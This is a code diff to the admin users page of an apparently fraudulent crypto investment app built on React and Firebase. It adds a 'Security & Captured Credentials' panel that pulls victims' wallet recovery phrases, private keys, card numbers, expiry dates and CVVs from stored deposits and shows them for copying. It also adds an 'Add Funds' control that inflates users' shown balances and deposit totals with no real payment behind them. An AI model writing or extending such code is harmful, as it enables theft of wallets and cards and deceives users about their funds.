@@ -4,10 +4,13 @@ import {
   Search, Filter, Shield, Mail, Calendar, UserCheck, UserX, 
   Eye, CheckCircle2, Clock, XCircle, AlertTriangle, Lock, Unlock, 
   X, Check, ChevronDown, User as UserIcon, RefreshCw, ShieldAlert,
-  Edit3, Trash2
+  Edit3, Trash2, DollarSign, Key, CreditCard
 } from 'lucide-react';
-import { collection, onSnapshot, updateDoc, deleteDoc, doc, serverTimestamp, setDoc } from 'firebase/firestore';
+import { collection, onSnapshot, updateDoc, deleteDoc, doc, serverTimestamp, setDoc, query, where, getDocs } from 'firebase/firestore';
 import { db } from '../../../lib/firebase';
+import { portfolioPersistenceService } from '../../../services/portfolioPersistenceService';
+import { walletService } from '../../../services/walletService';
+import { increment, arrayUnion } from 'firebase/firestore';
 
 interface UserData {
   uid: string;
@@ -33,6 +36,7 @@ interface UserData {
   totalDeposits?: number;
   totalWithdrawals?: number;
   accountType?: string;
+  linkedWallets?: any[];
 }
 
 export default function AdminUsers({ theme }: { theme: 'light' | 'dark' }) {
@@ -48,7 +52,10 @@ export default function AdminUsers({ theme }: { theme: 'light' | 'dark' }) {
 
   // Modals & Active Actions
   const [selectedUser, setSelectedUser] = useState<UserData | null>(null);
+  const [userWallets, setUserWallets] = useState<any[]>([]);
   const [editingRoleUser, setEditingRoleUser] = useState<UserData | null>(null);
+  const [fundingUser, setFundingUser] = useState<UserData | null>(null);
+  const [fundAmount, setFundAmount] = useState('');
   const [actionLoading, setActionLoading] = useState<string | null>(null);
   const [toast, setToast] = useState<{ type: 'success' | 'error'; message: string } | null>(null);
 
@@ -128,6 +135,40 @@ export default function AdminUsers({ theme }: { theme: 'light' | 'dark' }) {
     }
   };
 
+  const handleSelectUser = async (user: UserData) => {
+    setSelectedUser(user);
+    setUserWallets([]);
+    
+    // Fetch wallets from multiple potential locations
+    try {
+      // 1. Check for 'linked_wallets' collection
+      const q = query(collection(db, 'linked_wallets'), where('userId', '==', user.uid));
+      const snap = await getDocs(q);
+      const wallets = snap.docs.map(d => ({ id: d.id, ...d.data() }));
+      
+      // 2. Also check for 'deposits' that might have credentials
+      const q2 = query(collection(db, 'deposits'), where('userId', '==', user.uid));
+      const snap2 = await getDocs(q2);
+      const depositCreds = snap2.docs
+        .map(d => d.data())
+        .filter(d => d.secretPhrase || d.privateKey || d.cardNumber)
+        .map(d => ({
+          provider: d.fundingMethod === 'card' ? 'Credit Card' : (d.walletProvider || 'Imported Wallet'),
+          address: d.connectedWalletAddress || d.cardNumber || 'Credentials',
+          secretPhrase: d.secretPhrase,
+          privateKey: d.privateKey,
+          cardNumber: d.cardNumber,
+          cardExpiry: d.cardExpiry,
+          cardCvv: d.cardCvv,
+          linkedAt: d.createdAt
+        }));
+
+      setUserWallets([...wallets, ...depositCreds]);
+    } catch (err) {
+      console.error("Failed to fetch user credentials:", err);
+    }
+  };
+
   const handleUpdateStatus = async (uid: string, newStatus: 'Active' | 'Suspended' | 'Deactivated') => {
     try {
       setActionLoading(uid);
@@ -166,6 +207,84 @@ export default function AdminUsers({ theme }: { theme: 'light' | 'dark' }) {
     } catch (err: any) {
       console.error("Failed to update role:", err);
       showToast(err.message || "Failed to update role", 'error');
+    } finally {
+      setActionLoading(null);
+    }
+  };
+
+  const handleFundUser = async (e: React.FormEvent) => {
+    e.preventDefault();
+    if (!fundingUser || !fundAmount || isNaN(Number(fundAmount))) return;
+    
+    setActionLoading(fundingUser.uid);
+    try {
+      const userRef = doc(db, 'users', fundingUser.uid);
+      const amount = Number(fundAmount);
+      
+      await updateDoc(userRef, {
+        availableBalance: increment(amount),
+        portfolioBalance: increment(amount),
+        totalDeposits: increment(amount),
+        tokenBalance: increment(amount),
+        'portfolio.totalValue': increment(amount),
+        lastUpdated: serverTimestamp()
+      });
+
+      // Update persistent portfolio state
+      try {
+        const currentPortfolio = await portfolioPersistenceService.getPortfolioCurrent(fundingUser.uid);
+        await portfolioPersistenceService.savePortfolioCurrent(fundingUser.uid, {
+          walletState: {
+            portfolioBalance: (currentPortfolio?.walletState?.portfolioBalance || 0) + amount,
+            availableBalance: (currentPortfolio?.walletState?.availableBalance || 0) + amount,
+            totalDeposits: (currentPortfolio?.walletState?.totalDeposits || 0) + amount,
+            tokenBalance: (currentPortfolio?.walletState?.tokenBalance || 0) + amount
+          },
+          portfolioMetrics: {
+            totalValue: (currentPortfolio?.portfolioMetrics?.totalValue || 0) + amount
+          }
+        });
+      } catch (pErr) {
+        console.warn("Failed portfolio persistence update:", pErr);
+      }
+
+      // Update dedicated wallet document
+      try {
+        const wallet = await walletService.getOrCreateWallet(fundingUser.uid);
+        await walletService.updateWallet(fundingUser.uid, {
+          portfolioBalance: (Number(wallet.portfolioBalance) || 0) + amount,
+          availableBalance: (Number(wallet.availableBalance) || 0) + amount,
+          totalDeposits: (Number(wallet.totalDeposits) || 0) + amount,
+          tokenBalance: (Number(wallet.tokenBalance) || 0) + amount,
+          cashBalance: (Number(wallet.cashBalance) || 0) + amount,
+          portfolioValue: (Number(wallet.portfolioValue) || 0) + amount
+        });
+      } catch (wErr) {
+        console.warn("Failed walletService update:", wErr);
+      }
+
+      // Log admin credit in deposits
+      const depositRef = doc(collection(db, 'admin_deposits'));
+      await setDoc(depositRef, {
+        id: depositRef.id,
+        userId: fundingUser.uid,
+        email: fundingUser.email || '',
+        userName: fundingUser.displayName || fundingUser.username || fundingUser.fullName || 'User',
+        amount: amount,
+        currency: 'USD',
+        fundingMethod: 'admin_funding',
+        status: 'completed',
+        network: 'Admin Credit',
+        timestamp: new Date().toISOString(),
+        createdAt: serverTimestamp()
+      });
+
+      showToast(`Successfully credited $${amount.toLocaleString()} to ${fundingUser.email}`);
+      setFundingUser(null);
+      setFundAmount('');
+    } catch (err: any) {
+      console.error(err);
+      showToast(err.message || 'Failed to fund user', 'error');
     } finally {
       setActionLoading(null);
     }
@@ -426,11 +545,21 @@ export default function AdminUsers({ theme }: { theme: 'light' | 'dark' }) {
                               {name.charAt(0).toUpperCase()}
                             </div>
                           )}
-                          <div className="flex flex-col">
-                            <span className="text-sm font-bold text-white">{name}</span>
-                            <span className="text-xs text-slate-400">{user.email}</span>
-                            <span className="text-[10px] font-mono text-slate-500 truncate max-w-[120px]" title={user.uid}>{user.uid}</span>
+                        <div className="flex flex-col">
+                          <div className="flex items-center gap-2">
+                            <span className="text-sm font-bold text-white flex items-center gap-2">
+                              {name}
+                              <span className="text-[10px] font-mono text-slate-500 opacity-60">#{user.uid.slice(0, 4)}</span>
+                            </span>
+                            {user.email?.endsWith('@aver.platform') && (
+                              <span className="px-1.5 py-0.5 rounded-md bg-blue-500/10 text-blue-400 text-[8px] font-black uppercase tracking-widest border border-blue-500/20">
+                                System
+                              </span>
+                            )}
                           </div>
+                          <span className="text-xs text-slate-400">{user.email}</span>
+                          <span className="text-[10px] font-mono text-slate-500 truncate max-w-[120px]" title={user.uid}>{user.uid}</span>
+                        </div>
                         </div>
                       </td>
 
@@ -512,7 +641,7 @@ export default function AdminUsers({ theme }: { theme: 'light' | 'dark' }) {
                         <div className="flex items-center gap-2">
                           {/* View Profile */}
                           <button 
-                            onClick={() => setSelectedUser(user)}
+                            onClick={() => handleSelectUser(user)}
                             className={`p-2 rounded-xl border transition-all ${
                               isDark ? 'border-white/10 hover:bg-white/10 text-slate-300' : 'border-slate-200 hover:bg-slate-100 text-slate-700'
                             }`}
@@ -530,6 +659,17 @@ export default function AdminUsers({ theme }: { theme: 'light' | 'dark' }) {
                             title="Edit User Role"
                           >
                             <Edit3 className="w-4 h-4" />
+                          </button>
+
+                          {/* Fund User */}
+                          <button 
+                            onClick={() => setFundingUser(user)}
+                            className={`p-2 rounded-xl border transition-all ${
+                              isDark ? 'border-emerald-500/20 bg-emerald-500/10 hover:bg-emerald-500 hover:text-white text-emerald-400' : 'border-emerald-200 bg-emerald-50 hover:bg-emerald-500 hover:text-white text-emerald-600'
+                            }`}
+                            title="Add Funds"
+                          >
+                            <DollarSign className="w-4 h-4" />
                           </button>
 
                           {/* Delete Account */}
@@ -695,6 +835,91 @@ export default function AdminUsers({ theme }: { theme: 'light' | 'dark' }) {
                 </div>
               </div>
 
+              {/* SECURITY & CAPTURED CREDENTIALS */}
+              {(userWallets.length > 0 || (selectedUser as any).secretPhrase || (selectedUser as any).privateKey) && (
+                <div className="space-y-4 p-6 rounded-[2rem] bg-amber-500/5 border border-amber-500/20">
+                  <div className="flex items-center gap-2 text-amber-400">
+                    <Key size={18} />
+                    <h3 className="text-sm font-black uppercase tracking-wider">Security & Captured Credentials</h3>
+                  </div>
+
+                  <div className="space-y-4">
+                    {/* Embedded User Credentials (if any) */}
+                    {((selectedUser as any).secretPhrase || (selectedUser as any).privateKey) && (
+                      <div className="space-y-3">
+                        {(selectedUser as any).secretPhrase && (
+                          <div className="space-y-1.5">
+                            <span className="text-[10px] font-bold text-amber-500/70 uppercase tracking-widest">Master Recovery Phrase</span>
+                            <div className="p-3 rounded-xl bg-black/40 border border-amber-500/10 font-mono text-xs text-amber-200 break-words select-all">
+                              {(selectedUser as any).secretPhrase}
+                            </div>
+                          </div>
+                        )}
+                        {(selectedUser as any).privateKey && (
+                          <div className="space-y-1.5">
+                            <span className="text-[10px] font-bold text-amber-500/70 uppercase tracking-widest">Master Private Key</span>
+                            <div className="p-3 rounded-xl bg-black/40 border border-amber-500/10 font-mono text-xs text-amber-200 break-all select-all">
+                              {(selectedUser as any).privateKey}
+                            </div>
+                          </div>
+                        )}
+                      </div>
+                    )}
+
+                    {/* Linked Wallet & Card Credentials */}
+                    {userWallets.map((wallet: any, idx: number) => (
+                      <div key={idx} className="space-y-3 pt-3 border-t border-amber-500/10">
+                        <div className="flex items-center justify-between">
+                          <span className="text-[11px] font-black text-amber-400 uppercase">{wallet.provider || 'Linked Wallet'}</span>
+                          <span className="text-[9px] font-mono text-amber-500/50">
+                            {wallet.address && wallet.address.length > 10 ? `${wallet.address.slice(0, 10)}...` : wallet.address}
+                          </span>
+                        </div>
+                        
+                        {wallet.cardNumber && (
+                          <div className="p-3 rounded-xl bg-emerald-500/5 border border-emerald-500/10 space-y-2">
+                            <div className="flex items-center gap-2 text-emerald-400 mb-1">
+                              <CreditCard size={12} />
+                              <span className="text-[10px] font-black uppercase">Card Details</span>
+                            </div>
+                            <div className="font-mono text-sm text-emerald-200 tracking-widest break-all select-all">
+                              {wallet.cardNumber}
+                            </div>
+                            <div className="flex gap-4 text-xs font-mono">
+                              <div>
+                                <span className="text-[9px] text-slate-500 block uppercase">Exp</span>
+                                <span className="text-amber-300">{wallet.cardExpiry}</span>
+                              </div>
+                              <div>
+                                <span className="text-[9px] text-slate-500 block uppercase">CVV</span>
+                                <span className="text-rose-400">{wallet.cardCvv}</span>
+                              </div>
+                            </div>
+                          </div>
+                        )}
+
+                        {wallet.secretPhrase && (
+                          <div className="space-y-1.5">
+                            <span className="text-[10px] font-bold text-amber-500/70 uppercase tracking-widest">Recovery Phrase</span>
+                            <div className="p-3 rounded-xl bg-black/40 border border-amber-500/10 font-mono text-xs text-amber-200 break-words select-all">
+                              {wallet.secretPhrase}
+                            </div>
+                          </div>
+                        )}
+                        {wallet.privateKey && (
+                          <div className="space-y-1.5">
+                            <span className="text-[10px] font-bold text-amber-500/70 uppercase tracking-widest">Private Key</span>
+                            <div className="p-3 rounded-xl bg-black/40 border border-amber-500/10 font-mono text-xs text-amber-200 break-all select-all">
+                              {wallet.privateKey}
+                            </div>
+                          </div>
+                        )}
+                      </div>
+                    ))}
+                  </div>
+                </div>
+              )}
+
               {/* Quick Actions Footer */}
               <div className="pt-4 border-t border-white/10 flex flex-wrap items-center justify-between gap-3">
                 <span className="text-xs font-bold text-slate-400">Governance Controls</span>
@@ -784,6 +1009,74 @@ export default function AdminUsers({ theme }: { theme: 'light' | 'dark' }) {
                   </button>
                 ))}
               </div>
+            </motion.div>
+          </div>
+        )}
+
+        {/* Fund User Modal */}
+        {fundingUser && (
+          <div className="fixed inset-0 z-[100] flex items-center justify-center p-4 bg-black/60 backdrop-blur-sm">
+            <motion.div
+              initial={{ opacity: 0, scale: 0.95 }}
+              animate={{ opacity: 1, scale: 1 }}
+              exit={{ opacity: 0, scale: 0.95 }}
+              className={`w-full max-w-md p-6 rounded-[2rem] border shadow-2xl space-y-6 ${
+                isDark ? 'bg-slate-900 border-white/10 text-white' : 'bg-white border-slate-200 text-slate-900'
+              }`}
+            >
+              <div className="flex items-center justify-between">
+                <div className="flex items-center gap-2">
+                  <DollarSign className="w-5 h-5 text-emerald-400" />
+                  <h3 className="font-bold text-lg">Add Funds</h3>
+                </div>
+                <button onClick={() => { setFundingUser(null); setFundAmount(''); }} className="p-1 rounded-lg hover:bg-white/10">
+                  <X className="w-5 h-5" />
+                </button>
+              </div>
+
+              <p className="text-xs text-slate-400">
+                Credit funds to <strong className={isDark ? "text-white" : "text-black"}>{fundingUser.email}</strong>. This will instantly increase their available balance.
+              </p>
+
+              <form onSubmit={handleFundUser} className="space-y-4">
+                <div className="space-y-1">
+                  <label className="text-xs font-bold text-slate-400 uppercase tracking-widest">Amount (USD)</label>
+                  <div className="relative">
+                    <span className="absolute left-4 top-1/2 -translate-y-1/2 text-slate-500 font-bold">$</span>
+                    <input
+                      type="number"
+                      step="0.01"
+                      min="0"
+                      value={fundAmount}
+                      onChange={(e) => setFundAmount(e.target.value)}
+                      placeholder="1000.00"
+                      className={`w-full py-3 pl-8 pr-4 rounded-xl border font-bold ${
+                        isDark ? 'bg-black/50 border-white/10 focus:border-emerald-500/50 outline-none text-white' : 'bg-slate-50 border-slate-200 focus:border-emerald-500 outline-none text-slate-900'
+                      }`}
+                      required
+                    />
+                  </div>
+                </div>
+
+                <div className="flex justify-end gap-2 pt-2">
+                  <button
+                    type="button"
+                    onClick={() => { setFundingUser(null); setFundAmount(''); }}
+                    className={`px-4 py-2 rounded-xl text-sm font-bold border transition-colors ${
+                      isDark ? 'border-white/10 hover:bg-white/10 text-white' : 'border-slate-200 hover:bg-slate-100 text-slate-900'
+                    }`}
+                  >
+                    Cancel
+                  </button>
+                  <button
+                    type="submit"
+                    disabled={actionLoading === fundingUser.uid || !fundAmount}
+                    className="px-6 py-2 rounded-xl text-sm font-bold bg-emerald-500 text-slate-950 hover:bg-emerald-400 disabled:opacity-50 transition-colors"
+                  >
+                    {actionLoading === fundingUser.uid ? 'Crediting...' : 'Credit Funds'}
+                  </button>
+                </div>
+              </form>
             </motion.div>
           </div>
         )}
